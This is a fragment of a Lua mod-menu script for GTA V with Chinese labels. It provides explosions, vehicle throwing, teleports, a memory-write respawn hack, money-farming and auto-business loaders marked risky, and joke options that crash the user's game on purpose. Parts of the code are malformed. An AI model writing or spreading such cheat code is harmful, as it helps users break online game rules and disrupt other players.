        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, 0.0, 10.0, 0.0, true, true, true, true)
    end
end)
menu.toggle(funfeatures, "举起手来(按x)",{""}, "遇到警察该怎么做~",function(state)
    handsup = state
    while handsup do
        juqishoulai()
        util.yield()
    end
end)
menu.toggle_loop(funfeatures, "会跳的车", {}, '使附近的车辆全都跳起来！！！', function(toggle)
            local entities = GET_NEARBY_VEHICLES(PLAYER.PLAYER_ID(), 150)
            for _, vehicle in ipairs(entities) do
                REQUEST_CONTROL(vehicle)
                ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0, 0, 6.5, 0, 0, 0, 0, false, false, true)
            end
            util.yield(1500)
end)
menu.toggle_loop(funfeatures, "定点轰炸", {"pointbombing"}, "标点指定轰炸", function ()--=====heezy
    local waypointPos = get_waypoint_v3()
    if waypointPos then
        local hash = util.joaat('w_arena_airmissile_01a')
        loadModel(hash)
        waypointPos.z += 30
        local bomb = entities.create_object(hash, waypointPos)
        waypointPos.z -= 30
        ENTITY.SET_ENTITY_ROTATION(bomb, -90, 0, 0,  2, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, 0, 0, 0, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
            util.yield_once()
        end
        entities.delete_by_handle(bomb)
        executeNuke(waypointPos)
    end
end)
local dalishi = menu.list(funfeatures, "大力士选项", {}, "")
menu.toggle_loop(dalishi,"抛掷载具", {"throwcars"}, "在载具附近按E将载具抬起来,在按E将载具投掷出去.", function(on)
        throwvehs()
end)
menu.toggle_loop(dalishi,"抛掷NPC", {"throwpeds"}, "在NPC附近按E将NPC抬起来,在按E将NPC投掷出去.", function(on)
    throwpeds()
end)
menu.toggle(funfeatures, "动物模式", {"spawnfurry"}, "动物狂欢节", function(on)
        if on then
            menu.trigger_commands("IGFurry")
            menu.trigger_commands("walkstyle mop")
            notification("动物模式启动") 
        else
            restore_model()
        end
end)
menu.toggle_loop(funfeatures, "繁星点缀", {}, "烟花像繁星一样", function()
    coords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
        coords['x'] = coords['x'] + math.random(-100, 100)
        coords['y'] = coords['y'] + math.random(-100, 100)
        coords['z'] = coords['z'] + math.random(30, 100)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 38, 100.0, true, false, 0.0)
    util.yield(100)
end)
menu.toggle(funfeatures, "夜幕的选择题",{""}, "八嘎，都来做！！！",function(state)
    zcndxz(state)
end)
menu.toggle_loop(funfeatures, "雷电将军", {"leidian"}, "形成包围圈", function(on)
       YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'ls.png')
        if SCRIPT_MANUAL_START then
    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
    logo_alpha = 0
    logo_alpha_incr = 0.9
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then
                logo_alpha = 0
                util.stop_thread()
            end
            util.yield()
        end
    end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.45, 0.5,0, 1, 1, 1, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 0.5 then
                logo_alpha_incr = -0.9
            end
            if logo_alpha == 0 then
                util.stop_thread()
            end
            util.yield()
        end
    end)
end
      store_dir = filesystem.store_dir() .. '\\YMss\\'
      sound_selection_dir = store_dir .. '\\sound14.txt'
      if not filesystem.is_dir(store_dir) then
         util.toast("夜幕音频没有正确安装！.")
         util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
    MISC.FORCE_LIGHTNING_FLASH()
    GRAPHICS.SET_ARTIFICIAL_LIGHTS_STATE(toggled)
    baozhanquan()
end)
menu.toggle(funfeatures, "灵魂游荡", {""}, "", function(toggle)
        ghost = toggle 
        if ghost then
        all_peds = entities.get_all_peds_as_handles()
        user_ped = players.user_ped()
        clone = PED.CLONE_PED(user_ped,true, true, true)
        pos = ENTITY.GET_ENTITY_COORDS(clone, false)
		ENTITY.SET_ENTITY_COORDS(user_ped, pos.x-2, pos.y, pos.z)
        ENTITY.SET_ENTITY_ALPHA(players.user_ped(), 90, false)
        ENTITY.SET_ENTITY_INVINCIBLE(clone,true)
        menu.trigger_commands("invisibility remote")
        util.create_tick_handler(function()
        STREAMING.REQUEST_ANIM_DICT("move_crawl")
        PED.SET_PED_MOVEMENT_CLIPSET(clone, "move_crawl", -1)
        mod_uses("ped", if on then 12 else -12)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(clone, true)
        TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(clone, true)
        return ghost
        end)
        else
            clonepedpos = ENTITY.GET_ENTITY_COORDS(clone, false)
            ENTITY.SET_ENTITY_COORDS(user_ped, clonepedpos.x,clonepedpos.y,clonepedpos.z, false, false)
            entities.delete_by_handle(clone)
            ENTITY.SET_ENTITY_ALPHA(user_ped, 255, false)
            menu.trigger_commands("invisibility off")
        end
end)
menu.toggle(funfeatures, "兔子模式", {"spawnrabbit"}, "注意:掏出枪瞄准时会引发崩溃(XA)", function(on)
        if on then
            menu.trigger_commands("ACRabbit02")
            menu.trigger_commands("walkstyle mop")
            notification("兔子模式启动") 
        else
            restore_model()
        end
end)
menu.toggle(funfeatures, "飞天扫帚", {""}, "", function(on)
    flying_broom(on)
end)
menu.action(funfeatures,"50张多米诺骨牌", {}, "", function()
    local hash = util.joaat("prop_boogieboard_01")
    request_model_load(hash)
    local last_ent = players.user_ped()
    for i=2, 50 do 
        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(last_ent, 0, -i, 0)
        local d = entities.create_object(hash, c)
        ENTITY.SET_ENTITY_HEADING(d, ENTITY.GET_ENTITY_HEADING(last_ent))
        OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(d)
    end
end)
menu.toggle_loop(self, "神之力", {"YL"}, "", function()local other = menu
	if state == 0 then
		notification(notif_format, HudColour.black, "INPUT_ATTACK", "INPUT_AIM")
		local effect = Effect.new("scr_ie_tw", "scr_impexp_tw_take_zone")
		local colour = {r = 0.5, g = 0.0, b = 0.5, a = 1.0}
		request_fx_asset(effect.asset)
		GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
		GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(colour.r, colour.g, colour.b)
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(
			effect.name, players.user_ped(), 0.0, 0.0, -0.9,1.0, 1.0,1, 1.0, false, false, false
		)
		state = 1
	elseif state == 1 then
		PLAYER.DISABLE_PLAYER_FIRING(players.user(), true)
		PAD.DISABLE_CONTROL_ACTION(0, 25, true)
		PAD.DISABLE_CONTROL_ACTION(0, 68, true)
		PAD.DISABLE_CONTROL_ACTION(0, 91, true)
		local entities = get_ped_nearby_vehicles(players.user_ped())
		for _, vehicle in ipairs(entities) do
			if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) and
			PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) == vehicle then
				continue
			end
			if PAD.IS_DISABLED_CONTROL_PRESSED(0, 24) and
			request_control_once(vehicle) then
				ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 0.5, 1.0, 1.0,1, 0, false, false, true, false, false)
			elseif PAD.IS_DISABLED_CONTROL_PRESSED(0, 25) and
			request_control_once(vehicle) then
				ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, -70.0,1.0, 1.0,1, 0, false, false, true, false, false)
			end
		end
	end
end, function()
	state = 0
end)
menu.toggle_loop(self, "假死雷达（地图上不会出现你）", {"undeadotr"}, "", function()
    undead()
end, function ()
	ENTITY.SET_ENTITY_MAX_HEALTH(players.user_ped(), maxHealth_cantseeyouinmap)
end)
menu.toggle_loop(self, "一拳超人", {""}, "想不想在洛圣都当一拳超人呢~？", function()
    supermanpersonl()
end)
    local bones <const> = {
        0x49D9,	-- left hand
        0xDEAD,	-- right hand
        0x3779,	-- left foot
        0xCC4D	-- right foot
    }
    local colour = {r = 1.0, g = 0.0, b = 1.0, a = 1.0}
    local timer <const> = newTimer()
    local trailsOpt <const> = menu.list(self,"尾翼选项"), {}, ""
    local effect <const> = Effect.new("scr_rcpaparazzo1", "scr_mich4_firework_sparkle_spawn")
    local effects = {}
    
    menu.toggle_loop(trailsOpt,"尾翼", {"trails"}, "", function ()
        if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then
            STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)
            return
        end
        if timer.elapsed() >= 1000 then
            removeFxs(effects); effects = {}
            timer.reset()
        end
        if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
            local minimum, maximum = v3.new(), v3.new()
            MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), minimum, maximum)
            local offsets <const> = {v3(minimum.x, minimum.y, 0.0), v3(maximum.x, minimum.y, 0.0)}
            for _, offset in ipairs(offsets) do
                GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
                local fx =
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY(
                    effect.name,
                    vehicle,
                    offset.x,
                    offset.y,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    0.7, --scale
                    false, false, false,
                    0, 0, 0, 0
                )
                GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, colour.r, colour.g, colour.b, 0)
                table.insert(effects, fx)
            end
        elseif ENTITY.DOES_ENTITY_EXIST(players.user_ped()) then
            for _, boneId in ipairs(bones) do
                GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
                local fx =
                GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(
                    effect.name,
                    players.user_ped(),
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    0.0,
                    PED.GET_PED_BONE_INDEX(players.user_ped(), boneId),
                    0.7, --scale
                    false, false, false,
                    0, 0, 0, 0
                )
                GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, colour.r, colour.g, colour.b, 0)
                table.insert(effects, fx)
            end
        end
    end, function ()
        removeFxs(effects); effects = {}
    end)
    local trailColour = menu.colour(trailsOpt,"颜色", {"trailcolour"}, "", colour, false, function(newColour)
         colour = newColour 
    end)
    menu.rainbow(trailColour)
local ragdoll = menu.list(self, '碰瓷', {'JSragdollOptions'}, '想碰瓷吗？.（请勿在现实世界模仿~）')
   local fallTimeout = false
    menu.toggle(ragdoll, '碰瓷V1', {'JSfallOver'}, '', function(toggle)
        if toggle then
            local vector = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
            PED.SET_PED_TO_RAGDOLL_WITH_FALL(players.user_ped(), 1500, 2000, 2, vector.x, -vector.y, vector.z, 1, 0, 0, 0, 0, 0, 0)
        end
        fallTimeout = toggle
        while fallTimeout do
            PED.RESET_PED_RAGDOLL_TIMER(players.user_ped())
            util.yield_once()
        end
    end)

    menu.toggle_loop(ragdoll, '碰瓷V2', {'JSragdoll'}, '', function()
        ragdoll_self()
    end)
local yuleself = menu.list(self, "娱乐选项", {}, "对于自己的娱乐选项")
menu.action(yuleself, "IKUN想和你玩个游戏", {}, "看看IKUN能否保护你？", function()
    if randomizer(array) == "1" then
        notification("很幸运，IKUN保住了你的游戏，听首歌吧。", colors.black)
        store_dir = filesystem.store_dir() .. '\\YMss\\'
            sound_selection_dir = store_dir .. '\\sound7.txt'
           if not filesystem.is_dir(store_dir) then
               util.toast("夜幕音频没有正确安装！.")
              util.stop_script()
             end
            fp = io.open(sound_selection_dir, 'r')
             local file_selection = fp:read('*a')
             fp:close()
                 local sound_location = store_dir .. '\\' .. file_selection
              if not filesystem.exists(sound_location) then
                    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
              else
               PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
              end
           util.keep_running()
    else
        notification("抱歉，IKUN没有保住你的游戏", colors.black)
    util.yield(3000)
    ENTITY.APPLY_FORCE_TO_ENTITY(0, 0, 0, 0, 0, 0, 0, 0, 0, false, false, false, false, false)
    end

end)
menu.action(yuleself, "学习资料", {}, "点击我获得学习资料！:)", function()
    util.toast("你个老sp，游戏已经满足不了你了吗？")
end)
menu.action(yuleself, "点击我去学习", {}, "快去学习！~~:)", function()
    util.toast("游戏马上关闭，快去写作业！")
    util.yield(3000)
    ENTITY.APPLY_FORCE_TO_ENTITY(0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0)

end)
menu.toggle_loop(self, "快速复活", {"fuhuo"}, "", function()
    local ped_ptr = entities.handle_to_pointer(players.user_ped())
    local gwobaw = memory.script_global(2672505 + 1684 + 756) -- Global_2672505.f_1684.f_756
    if entities.get_health(ped_ptr) < 100 then
        GRAPHICS.ANIMPOSTFX_STOP_ALL()
        memory.write_int(gwobaw, memory.read_int(gwobaw) | 1 << 1)
    end
end,
    function()
    local gwobaw = memory.script_global(2672505 + 1684 + 756)
    memory.write_int(gwobaw, memory.read_int(gwobaw) &~ (1 << 1)) 
end)
menu.toggle(self,"炫彩屏幕", {}, "", function(on)
    xuancaipm(on)
end)
menu.toggle_loop(self, "上帝之指", {"godfinger"}, "移动实体当你用手指指向他们时。按B键开始指向。", function()
    godfinger()
end)
menu.action(self, "坤巴射炮", {""}, "要来一发炸裂的炮火吗？", function ()
    local ptfx_asset = "scr_indep_fireworks"
    local effect_name = "scr_indep_firework_trailburst"
    diaoshepao(ptfx_asset)
    GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx_asset)
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, players.user_ped(), 0.0, 0.0, -0.3, 90.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0)
    for i=1, 10 do 
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, i, 0.0)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 67, 0.0, false, false, 0.0, true)
    end
end)
local gendou = menu.list(self, "表演选项", {}, "对于自己的娱乐选项")
menu.action(gendou, '前空翻', {}, '孙行者', function ()
    local hash = util.joaat("prop_ecola_can")
    request_model_load(hash)
    local prop = entities.create_object(hash, players.get_position(players.user()))
    ENTITY.FREEZE_ENTITY_POSITION(prop)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), prop, 0, 0, 0, 0, 0, 0, 0, true, false, false, false, 0, true)
    local hdg = CAM.GET_GAMEPLAY_CAM_ROT(0).z
    ENTITY.SET_ENTITY_ROTATION(prop, 0, 0, hdg, 1)
    for i=1, -360, -16 do
        ENTITY.SET_ENTITY_ROTATION(prop, i, 0, hdg, 1)
        util.yield()
    end
    ENTITY.DETACH_ENTITY(players.user_ped())
    entities.delete_by_handle(prop)
end)
menu.action(gendou, '后空翻', {}, '孙行者', function ()
    local hash = util.joaat("prop_ecola_can")
    request_model_load(hash)
    local prop = entities.create_object(hash, players.get_position(players.user()))
    ENTITY.FREEZE_ENTITY_POSITION(prop)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), prop, 0, 0, 0, 0, 0, 0, 0, true, false, false, false, 0, true)
    local hdg = CAM.GET_GAMEPLAY_CAM_ROT(0).z
    ENTITY.SET_ENTITY_ROTATION(prop, 0, 0, hdg, 1)
    for i=1, 360, 16 do
        ENTITY.SET_ENTITY_ROTATION(prop, i, 0, hdg, 1)
        util.yield()
    end
    ENTITY.DETACH_ENTITY(players.user_ped())
    entities.delete_by_handle(prop)
end)
local firebreath = menu.list(gendou, '喷火', {}, '')
    menu.toggle(firebreath, '嘴火', {'JSfireBreath'}, '', function(toggle)
        firebreathxxx(toggle)
    end)
    menu.slider(firebreath, '嘴火比例', {'JSfireBreathScale'}, '', 1, 100, fireBreathSettings.scale * 10, 1, function(value)
        firebreathscale(value)
    end)
    menu.rainbow(menu.colour(firebreath, '嘴火颜色', {'JSfireBreathColour'}, '', fireBreathSettings.colour, false, function(colour)
        firebreathcolour(colour)
    end))
menu.toggle(self, "游泳爱好者", {}, "", function(on)
    if on then
        menu.trigger_commands("swiminair on")
    else
        menu.trigger_commands("swiminair off")
    end
end)
menu.toggle_loop(self, "世界毁灭者", {""}, "", function()
	forcefielddd()
    menu.trigger_commands("YL on")
    wait(2000)
    menu.trigger_commands("YL off")
    menu.trigger_commands("yunluo on")
    wait(2000)
    menu.trigger_commands("yunluo off")
end)
menu.toggle(self, "骑牛", {}, "",function(state)
    ride_cow(state)   
end)
Heist_Control = menu.list(zidongrenwu, "HC(3.1.3)任务选项(含自动产业等)")
Heist_Control_Load = menu.action(Heist_Control, "加载任务选项", {""}, "", function()

notification("正在加载任务脚本选项,请稍等",colors.blue)
util.yield(2000)
    require "lib.yymmlib.YMhc"
    menu.delete(Heist_Control_Load)
end)
local snowmens = {
    { -955.5352, -782.4186, 15.925326 },
    { -819.9067, 165.35524, 71.26295 },
    { -247.92003, -1561.2175, 32.22973 },
    { 901.3996, -288.05026, 65.643715 },
    { 1275.6772, -642.3789, 68.208786 },
    { 1993.1008, 3829.6396, 32.167336 },
    { -375.47916, 6230.158, 31.490055 },
    { -1414.4647, 5094.9272, 60.674263 },
    { -1946.0231, 594.93756, 119.79223 },
    { -1100.889, -1401.0138, 5.215467 },
    { -780.418, 877.2859, 203.18001 },
    { -455.12027, 1130.5625, 325.89175 },
    { 221.46722, -107.01075, 69.763985 },
    { 1560.3787, 6447.053, 23.9866 },
    { 3301.7886, 5149.8853, 18.34274 },
    { 1703.0568, 4671.928, 43.15301 },
    { 224.9161, 3107.3345, 42.18394 },
    { 2360.0037, 2522.7166, 46.66731 },
    { 1510.8555, 1725.0353, 109.89355 },
    { -48.96374, 1964.4028, 189.87181 },
    { -1516.2083, 2140.2168, 56.11924 },
    { -2826.2356, 1424.6211, 100.706116 },
    { -2957.531, 723.6389, 28.792404 },
    { 1341.4302, -1583.5093, 54.135414 },
    { 178.00232, -895.9712, 30.69326 }
}
xueren = menu.list(zidongrenwu,"雪人地点传送", {},"一键传送到对应位置！~")
local snow_loca = menu.list(xueren, "雪人", {}, "")
for idx, coords in snowmens do
    snow_loca:action("雪人 " .. idx, {}, "传送到圣诞雪人", function()
        util.teleport_2d(coords[1], coords[2])
    end)
end

util.keep_running()
baoguo = menu.list(zidongrenwu,"武器厢型车传送", {},"一键传送到对应位置！~")
zhaobaoguo = menu.action(baoguo, "加载厢型车地点传送选项", {""}, "寻找厢型车！", function()
        notification("正在加载武器厢型车地点传送,请稍等...",colors.blue)
        util.yield(2000)
        require "lib.yymmlib.YMbaoguo"
        menu.delete(zhaobaoguo)
    end)
duchang = menu.list(zidongrenwu,"赌场（类似于刷钱）", {},"恢复选项！~")
duchangxuanxiang = menu.action(duchang, "加载赌场选项", {""}, "！", function()
        notification("正在加载赌场选项,请稍等...",colors.blue)
        util.yield(2000)
        require "lib.yymmlib.YMduchang"
        menu.delete(duchangxuanxiang)
    end)
Musiness_Banager = menu.list(zidongrenwu, "自动产业 注:[风险]")
Musiness_Banager_Load = menu.action(Musiness_Banager, "加载自动产业", {""}, "", function()
notification("正在加载自动产业,请稍等",colors.black)
util.yield(2000)
    require "lib.yymmlib.YMauto"
    menu.delete(Musiness_Banager_Load)
end)
while true do
    util.yield()
end
HUD={
    ["HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED"]=--[[Hash (int)]] function()native_invoker.begin_call()native_invoker.end_call_2(0xA48931185F0536FE)return native_invoker.get_return_value_int()end,
}
while true do
    if bigbarrelqq then
        if (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) ~= -1810795771) then
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
    end
end
    util.yield()
end   
while true do
    if bigbarrelqqV2 then
        if (HUD.HUD_GET_WEAPON_WHEEL_CURRENTLY_HIGHLIGHTED(plyped()) ~= -1810795771) then
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1810795771,15,true,true)
    end
end
    util.yield()
end   